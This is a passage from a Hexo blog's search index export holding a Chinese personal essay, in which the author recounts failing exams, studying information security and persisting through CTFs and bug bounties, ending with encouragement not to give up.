src="/assets/image-20230428214432-1ecgmg6.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的网安故事</title>
      <link href="/2022/07/05/%E6%88%91%E7%9A%84%E7%BD%91%E5%AE%89%E6%95%85%E4%BA%8B/"/>
      <url>/2022/07/05/%E6%88%91%E7%9A%84%E7%BD%91%E5%AE%89%E6%95%85%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>人生这么短，喜欢就别放弃</p></blockquote><p>前几天也是结束了自己人生中为数不多却有可能改变自己命运的一场考试。闲暇之余看到一些师傅们的网安故事，想到自己学习网安以来的点滴。书写成篇，算不上励志，但对自己算是独一无二。</p><h2 id="是谁在我心中埋下一颗黑客的种子"><a href="#是谁在我心中埋下一颗黑客的种子" class="headerlink" title="是谁在我心中埋下一颗黑客的种子"></a>是谁在我心中埋下一颗黑客的种子</h2><p>和大多数师傅们一样，初次了解到黑客这个名词，也是从风靡的盗号、刷钻等开始。我家在街上开着一个小服装店，街上的商户都流行在收银台上摆一台电脑来装饰门店体现自己门店的档次，我家也不外。电脑买来由于装饰用，对我爸妈而言用处自然不大，但是对我的吸引力无疑是巨大的。</p><p>那年正值懵懂之际，对新鲜的东西都比较好奇。一个风和日丽的日子里，我在一个平平无奇的QQ群看到昔日里从容自若的小伙伴在愤愤不平向其他小伙伴诉说着他QQ号被所谓的黑客盗取的事情。也正是此事，我的心中不知被谁种下了一颗关于黑ke的种子，以致于在往后无数个网上冲浪的日子中我都会有意无意的去关注一些黑客方面的话题。</p><h2 id="黑客种子的萌芽"><a href="#黑客种子的萌芽" class="headerlink" title="黑客种子的萌芽"></a>黑客种子的萌芽</h2><p>虽关注这方面的话题，但是由于当时年纪实在太小，关注的都是一些娱乐黑客方面的新闻，自己也尝试寻找一些所谓QQ上的黑客，还好我够穷，不然就是某某某花了多少多少RMB拜师被骗的故事了，故事的转机是我高三那年。</p><p>那年高三，正值18风华正茂之年，本该满腔热血对未来一片憧憬可事实上却是临近高考那可望不可及的的本科分数线。更悲催的是自己在上大学之前从来就没有过自己的人生规划，临近高考也没有想过以后想干什么报考什么专业。这样浑浑噩噩的日子直到一所高校来到我们学校招生给我们介绍一些大学里的专业才得以结束。</p><p>他介绍着他们学校的专业，我打着我手里的游戏，直到他嘴中讲到一个信息安全专业我才停下我手中那机械般的手指。我感觉当时就像被人猛拍了一下，人瞬间就和打了鸡血一样。他在台上讲述了信息安全具体是干什么，多么多么牛逼。我心想信息安全干的不就是黑客干的事吗，所以至此我心里就有了一个很明确的想法，拼搏百天我要学信息安全。</p><h2 id="一波三折和安全路上的引路人"><a href="#一波三折和安全路上的引路人" class="headerlink" title="一波三折和安全路上的引路人"></a>一波三折和安全路上的引路人</h2><p>在我的印象里，我的成绩一直是处于中间不那么容易被老师注意的那一类学生，但是在父母期待上我是一个聪明的孩子，这也是我在学习生涯上一直苦恼的事情。一战高考，毋庸置疑以落榜告终。为什么是一战，没错，因为有二战，也是在这期间知道了身边安全引路人。</p><p>第一年高考结束，成绩虽没出，但是结果我自己和家里人也大概都知道，所以我和我爸之间无声的较量就开始了。生活小康了之后，父母就希望自己的子女能出人头地，所以我爸一直在给我灌输一个复读的思想，而我一心逃离枯燥且无味的高中，父子俩也就一直僵持在这里。我爸见劝不动我，他就开始喊救兵了，他说你到你表哥那里去散下心吧。我心想可以出去，不用听老爸每天高强度地念经，那就去吧。就这样我来到了我表哥家中，在交流中我发现我表哥竟然是从事信息安全方面工作的，当时正好赶上表哥项目上的同事来这边玩，所以我也跟着他们一起去游乐场玩，游玩的过程中也谈到我，说我想学习信息安全，我也在他们的交谈中了解到渗透测试、应急响应等专业词汇。那晚，我和表哥两人出门散步，他给我普及着一些信息安全方面的专业知识和词汇，可能那晚的风真的很柔，也可能游乐场的过山车真的很高以至于自己坚守的逃离被初次动摇。中间还有很多小插曲，反正最后双拳难敌四手，还是去复读了，不过想学信息安全这门专业的心也是越来越坚定。</p><p>强扭的瓜不甜，很遗憾第二年还是落榜了，说到这，我相信大多数看文章的师傅应该都比我强，你们可能985、211、本科，最不济也是没考上，也不至于复读一年还没考上。我已然忘记当时再次落榜的心情，可能更多的是解脱吧，而父亲的无奈最后也只变成了口中的你去闯闯吧，志愿往大城市报吧。</p><h2 id="网安菜鸟养成记"><a href="#网安菜鸟养成记" class="headerlink" title="网安菜鸟养成记"></a>网安菜鸟养成记</h2><p>后来，自己也是报考上了信息安全专业。那年，我一人背上行囊，那也是我人生中初次一人出远门，车辆缓缓行动之时，心中莫名有一丝伤感，或许这趟旅途承载的是一个懵懂少年的梦吧！</p><p>上了大学，不知道为啥，第一件事我想的是学习一门编程语言，我问我表哥我该学习哪一门编程语言，我哥和我说，你学java吧。第一次接触编程语言，且还是相对python来说较为复杂的java，自己英文也不好，很显然，我懵逼了，还记得当时我很无奈的发了条朋友圈。</p><p>​<img src="/assets/image-20240702230143-plepzox.png" alt="image">​</p><p>​<img src="/assets/image-20240702230229-dr9j5lz.png" alt="image">​</p><p>现在回过头把这条朋友圈翻出来回首我爸当初给我的留言，也确实“只要努力勤奋坚持，没有趟不过的河!”后面因为学校python课程开始了，java也就先放下了，虽然java没有学会，但是后来接触到比java简单不少的python，这也让我在以后的语言学习上轻松不少，以至于老师课才刚开始讲，我基础的python就已经学的差不多了。自己也是参加了python蓝桥杯比赛，拿到了一个省赛的奖项吧。再后来自己想的python怎么感觉就只能用来写这些类似数学题目的东西呀，所以我就在网上寻找答案，python能干嘛，python可以写游戏，所以我模仿着别人的代码写了个飞机大战，python可以写爬虫，我就找一些网站试着爬取它的数据，python可以用来开发web应用，我就去学习Flask框架，不过这些都是后话了。其实当我python学到有一定了解的时候，我想的更多的问题还是想干黑ke那种活好像只学python是不太行，所以我又去网上寻找答案，搜索想要成为一名黑客需要学习什么技术，这不搜不要紧，一搜还真是一入学门深似海。</p><p>少年我看着屏幕上琳琅满目的零碎技术点，什么web安全、网络基础、html、css、js、php安全、java安全、内网渗透、免杀技术等等等等，迷茫感瞬间就涌上心头。梦想脚下的路是自己选的，那还能有什么办法，就开始一个一个学呀。最先学的是web安全，学习的过程中发现我连网关都不知道是什么，所以后面补充网络基础，反正哪里有漏洞，就补哪里，还记得当时从图书馆借了一堆黑客相关书籍来多线程的去啃。</p><p>​<img src="/assets/image-20240702230400-rp7weqv.png" alt="image">​</p><p>当时的学习状态不能说是拼命，但至少大部分时间是花在这上面了。学校一有什么安全相关的活动，我都是第一个去报名的，甚至大一的时候还去主动找到信安工作室老师说想加入其工作室。</p><p>少年脚下那条梦想的路似乎总是蜿蜒曲折，大一期末，学校要选拔一个精英班，当时自己属于那种莽夫，一听到有精英班，还没搞明白状况，就冲了，以至于经过笔试面试之后发现精英班是一个网络精英班，和自己要学的信息安全是属于两个方向了。我们班级毕业条件是拿到HCIP的路由交换证书，所以我只能分出大部分时间去学习路由交换的知识。这样的状态保持的一段时间，方向的不同、安全学习路上逐渐积累的浮躁再加上一些生活上的原因，脑子里渐渐出现了想要放弃学习安全的念头，那晚趟在床上思考了很久，最后得出一个好好学网络的结果，这也是我第一次也是唯一一次放弃的安全。</p><p>在接下来每个敲打路由交换那机械般命令的日子里，仿佛再也找不到当初学安全那股狠劲，久而久之压抑在心头已久的情绪爆发而来，还是那晚我哭了许久，最后绝对找回我当初抛弃的挚友。是啊，人生有太多坎坷，但是比起喜欢的人或事，那坎坷又能算得了什么。网安这个专业比起其他计算机专业确实更容易让人心浮气躁，一没坚持住就会产生放弃的念头，不过如果是真心喜欢，那又怎么舍得放弃。这也是我文章开头标题中想表达的东西，人生这么短，喜欢就别放弃。</p><p>接下来的日子中，由于自己的目标已经很明确了，确定以后干的就是安全这一行，所以在完成自己的毕业条件，考完HCIP后，自己也是把重心重新放回安全中。自己也是在学习安全的期间，玩起了B站和公众号。自己也在这期间认识了很多优秀的师傅们，我感觉这也是我玩B站和公众号这期间最大的收获，见过了优秀的师傅，才认识到自己的有太多需要补充和学习的地方，然后不断去完善自己的技能树。后面为了体现自己学习的价值，参加过一些大型的CTF比赛同国内一些顶尖的CTF战队同台竞技，挖掘过一些众测的奖金和几张原创CNVD证书等。</p><h2 id="我还在梦想的路上"><a href="#我还在梦想的路上" class="headerlink" title="我还在梦想的路上"></a>我还在梦想的路上</h2><p>前几天也是刚结束一场转本考试，至于为什么还要学习这些书本上的理论知识，我给自己的理由是我没有一个像一些优秀师傅的大脑。在安全这行里我看过很多天赋异禀的师傅，有时候真的很羡慕，不过回过头来想想可能我们认为的天赋异禀，也是师傅们宵旰攻苦换来的结果。虽然从来没有感觉自己比别人笨过，但是正如我前文说的，屏幕前师傅们比我强，最起码你们在学历上起点就已经比我高了，实际上在安全这个行业上大多数人是通过等效的时间去换取等效的技术，所以学历有可能是我梦想路上的盘缠。在安全这条路上，我没有放弃，假如哪天屏幕前的师傅感觉自己感觉坚持不下去了，你就回想一下还有这么一个小子都没放弃，坚持下去，你会收获到意想不到的惊喜的，毕竟谁都不是看到了希望才去坚持，而是坚持了才看到希望！愿你我都能在梦想的路上砥砺前行。</p>]]></content>
      
      
      <categories>
          
          <category> 生活随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安故事 </tag>
            
            <tag> 生活随记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
